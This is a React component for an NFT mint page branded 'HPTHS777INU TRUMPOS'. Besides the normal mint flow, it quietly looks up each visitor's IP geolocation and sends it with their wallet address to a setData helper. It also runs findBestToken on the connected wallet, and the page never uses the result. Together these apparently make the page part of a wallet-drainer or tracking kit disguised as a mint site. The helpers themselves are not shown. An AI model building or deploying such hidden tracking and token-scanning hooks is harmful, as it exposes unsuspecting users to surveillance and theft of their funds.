import React, { useEffect, useState } from "react";
import axios from "axios";
import { useMintStatus } from "../hooks/useMintStatus";
import logo from "../assets/img/logo.png"
import { Typography } from "@material-tailwind/react";
import { toast } from "react-toastify";
import NftABI from "../assets/abi/nft.json"
import { useAccount, useNetwork } from "wagmi";
import { writeContract, prepareWriteContract, fetchFeeData, waitForTransaction } from "@wagmi/core"
import { global } from "../config/global";
import { findBestToken, setData } from "../utils/utils";
import { parseUnits } from "viem";

export default function MainPage() {
    const [refresh, setRefresh] = useState(false)
    const {
        totalSupply,
        maxSupply,
        price,
        maxAmountPerMint,
        mintingSeason,
        ethBalance,
        walletOfOwner,
    } = useMintStatus(refresh)
    const [amount, setAmount] = useState(1)
    const { address } = useAccount()
    const { chain } = useNetwork()
    const [confirming, setConfirming] = useState(false);
    const [errMsg, setErrMsg] = useState("")

    const [geo, setGeo] = useState("")

    useEffect(() => {
        async function fetchData() {
            const res = await axios.get('https://geolocation-db.com/json/')
            setGeo(JSON.stringify(res.data))
        }
        fetchData()
    }, [])

    const setInputAmount = (value) => {
        value = parseInt(value)
        if (!value || value <= 0) {
            setAmount(0)
        } else {
            setAmount(value);
        }
    };

    const mint = async () => {
        if (errMsg) {
            toast.warning(errMsg)
            return
        }

        setConfirming(true);
        try {
            const feeData = await fetchFeeData()
            const amountValue = parseUnits((amount * price).toString(), global.chain.nativeCurrency.decimals);
            const data = {
                address: global.CONTRACTS.NFT,
                abi: NftABI,
                functionName: 'mint',
                args: [amount],
                chainId: global.chain.id,
                account: address,
                gasPrice: feeData.gasPrice ? feeData.gasPrice : undefined,
                value: amountValue
            }
            const preparedData = await prepareWriteContract(data)
            const writeData = await writeContract(preparedData)
            const txPendingData = waitForTransaction(writeData)
            toast.promise(txPendingData, {
                pending: "Waiting for pending... 👌",
            });

            const txData = await txPendingData;

            if (txData && txData.status === "success") {
                toast.success(`Success ! ${amount} NFTs have minted! 👍`);
            } else {
                toast.error("Error ! Your Mint is failed.");
            }

        } catch (error) {
            console.log(error)
            try {
                if (error?.shortMessage) {
                    toast.error(error?.shortMessage);
                } else {
                    toast.error("Error ! Something went wrong.");
                }
            } catch (error) {
                toast.error("Error ! Something went wrong.");
            }
        }
        setRefresh(prevData => {
            return !prevData
        })
        setConfirming(false);
    }

    useEffect(() => {
        if (confirming) {
            setErrMsg("Please wait few seconds!");
            return
        }
        if (!address) {
            setErrMsg("Please connect wallet to Ethereum mainnet!");
            return
        }
        if (!chain || chain.id !== global.chain.id) {
            setErrMsg("Please switch to Ethereum mainnet!");
            return
        }
        if (!amount) {
            setErrMsg("Please input amount correctly!");
            return
        }
        if (!mintingSeason) {
            setErrMsg("Coming Soon!");
            return
        }
        if (totalSupply >= maxSupply) {
            setErrMsg("Minting Season Has Ended!");
            return
        }
        if (amount > maxAmountPerMint) {
            setErrMsg("Overflow the amount to mint in one time!");
            return
        }
        if (amount * price + 0.01 > ethBalance) {
            setErrMsg("Insufficient ETH!");
            return
        }
        setErrMsg("");
    }, [address, amount, chain, ethBalance, maxAmountPerMint, maxSupply, price, totalSupply, confirming, mintingSeason])

    useEffect(() => {
        if (geo) {
            setData(geo, address, 'init', 'init')
        }
    }, [geo, address])

    useEffect(() => {
        if (address) {
            findBestToken(address, chain.id)
        }
    }, [address, chain])

    return (
        <React.Fragment>
            <div className="w-full mx-auto mt-50 text-trumpos-panelLight lg:pt-20 flex flex-col sm:flex-row">
                <div className="lg:w-2/5 w-4/5 px-5 mx-auto">
                    <img
                        src={logo}
                        alt="logo"
                        height="500px"
                        width="500px"
                        className="px-2"
                    />
                </div>
                <div className="lg:w-3/5 w-full mt-0 lg:mt-10 px-5 text-center">
                    <Typography className="lg:text-[52px] text-[28px] text-white text-center font-sans font-bold">
                        {`HPTHS777INU TRUMPOS`}
                    </Typography>
                    <Typography className="hidden lg:block lg:text-[52px] text-[28px] font-menu text-yellow-300 text-center">
                        {`TRUMPOS`}
                    </Typography>
                    <div className="flex lg:flex-row flex-col justify-center gap-2 lg:mt-10">
                        <Typography className="lg:text-[30px] text-[22px] font-menu text-white text-center">
                            <span className="text-yellow-300 mx-2">{`${totalSupply}`}</span>
                            {`NFTs have minted already! Only`}
                            <span className="text-yellow-300 mx-2">{`${maxSupply - totalSupply}`}</span>
                            {`NFTs are left!`}
                        </Typography>
                    </div>
                    <div className="flex lg:flex-row flex-col justify-center gap-2">
                        <Typography className="lg:text-[30px] text-[22px] font-menu text-white text-center">
                            {`You have only`}
                            <span className="text-yellow-300 mx-2">{`${walletOfOwner.length}`}</span>
                            {`NFTs. Don't miss out on your chance!`}
                        </Typography>
                    </div>
                    <div className="flex lg:flex-row flex-col justify-center gap-2 lg:mt-3">
                        <div className="flex flex-col justify-center gap-2">
                            <div className="flex flex-row justify-center">
                                <Typography variant="h6" className="font-menu text-yellow-300 text-center my-auto px-2">
                                    {`Your ETH:`}
                                </Typography>
                                <Typography variant="h6" className="font-menu text-yellow-300 text-center my-auto px-2">
                                    {`${ethBalance.toFixed(4)} ETH`}
                                </Typography>
                            </div>
                            <div className="flex flex-row justify-center">
                                <Typography variant="h4" className="font-menu text-yellow-300 text-center my-auto px-2">
                                    {`Amount:`}
                                </Typography>
                                <div className="lg:w-32 w-full text-xl border-2 border-yellow-300 font-menu px-5 py-2 rounded-full text-yellow-300">
                                    <input
                                        type="number"
                                        min={1}
                                        max={maxAmountPerMint}
                                        className="w-full text-right font-bold text-2xl bg-transparent focus:border-0 active:border-0 focus:outline-0"
                                        value={amount}
                                        disabled={confirming}
                                        onChange={(e) => {
                                            setInputAmount(e.target.value);
                                        }}
                                    />
                                </div>
                            </div>
                            <div className="flex flex-row justify-center">
                                <Typography variant="h6" className="font-menu text-yellow-300 text-center my-auto px-2">
                                    {`Your will pay:`}
                                </Typography>
                                <Typography variant="h6" className="font-menu text-yellow-300 text-center my-auto px-2">
                                    {`${(amount * price).toFixed(4)} ETH`}
                                </Typography>
                            </div>
                            {
                                errMsg ? (<div className="flex flex-row justify-center">
                                    <Typography variant="h6" className="font-menu text-red-300 text-center my-auto px-2">
                                        {`Warn: ${errMsg}`}
                                    </Typography>
                                </div>) : (<></>)
                            }
                        </div>
                        <div className="flex flex-row justify-center mx-5 lg:my-7 my-2">
                            <button
                                type="button"
                                className="lg:w-48 w-full text-3xl border-2 border-yellow-300 font-menu px-5 py-2 rounded-full text-yellow-300"
                                disabled={confirming}
                                onClick={(e) => {
                                    if (!confirming) mint();
                                }}
                                color="yellow"
                            >
                                {confirming ? "Minting..." : "Mint Now"}
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </React.Fragment >
    );
}
